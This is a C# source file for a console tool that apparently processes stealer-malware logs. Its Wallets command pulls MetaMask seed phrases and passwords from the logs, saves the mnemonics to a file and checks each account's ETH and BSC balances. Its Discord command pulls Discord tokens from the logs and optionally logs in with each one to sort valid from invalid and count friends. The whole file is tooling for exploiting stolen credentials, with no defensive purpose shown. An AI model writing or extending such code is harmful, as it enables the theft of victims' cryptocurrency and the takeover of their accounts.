using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Discord;
using Core.Wallets;
using Microsoft.Extensions.Configuration;

namespace Console.Views;

public class MainView : ArgsView
{
    private readonly Settings _settings;
    private readonly IConfiguration _config;
    
    public MainView(IRoot root, Settings settings, IConfiguration config) : base(root)
    {
        _settings = settings;
        _config = config;
    }
    
    [Command]
    public async Task Wallets()
    {
        Directory.CreateDirectory("Wallets");

        using var mnemonics = new StreamWriter("Wallets/mnemonics.txt", new FileStreamOptions
        {
            Access = FileAccess.Write,
            Mode = FileMode.OpenOrCreate,
        });
        var checker = new MetamaskChecker(_config["Web3:Eth"]!, _config["Web3:Bsc"]!);
        
        foreach (var wallet in new MetamaskParser().ByLogs(_settings.Path).DistinctBy(x => x?.Mnemonic))
        {
            if (wallet is not {Mnemonic:not null, Password:not null}) continue;
            
            System.Console.WriteLine(wallet.Mnemonic);
            await mnemonics.WriteLineAsync(wallet.Mnemonic);
            
            foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
            {
                System.Console.WriteLine(account.Name);
                System.Console.WriteLine(account.Address);
                
                foreach (var balance in await checker.Balance(account.Address))
                {
                    System.Console.WriteLine($"{balance.Key}: {balance.Value}");
                }
            }
        }
        
        System.Console.WriteLine("Press any key for continue");
        System.Console.ReadKey(true);
    }

    [Command]
    public Task Discord()
    {
        Directory.CreateDirectory("Discord");
        
        StreamWriter? all, invalid = null, valid = null;

        var options = new FileStreamOptions
        {
            Access = FileAccess.Write,
            Mode = FileMode.OpenOrCreate,
        };
        var checker = new DiscordChecker();
        
        System.Console.WriteLine("Check tokens? [Y/N]"); // todo add check proxies

        var check = System.Console.ReadKey(true).Key == ConsoleKey.Y;

        all = new StreamWriter("Discord/tokens.txt", options);
        
        if (check)
        {
            invalid = new StreamWriter("Discord/invalid.txt", options);
            valid = new StreamWriter("Discord/valid.txt", options);
        }

        foreach (var token in new DiscordParser().ByLogs(_settings.Path).Distinct())
        {
            all.WriteLine(token);

            if (!check) continue;

            if (checker.TryLogin(token) is {} account)
            {
                System.Console.WriteLine($"Token: {token}\nFriends: {checker.Friends(account)?.Count() ?? 0}");
                valid!.WriteLine(token);
            }
            else
                invalid!.WriteLine(token);
        }

        all.Dispose();
        invalid?.Dispose();
        valid?.Dispose();
        
        System.Console.WriteLine("Press any key for continue");
        System.Console.ReadKey(true);
        
        return Task.CompletedTask;
    }
}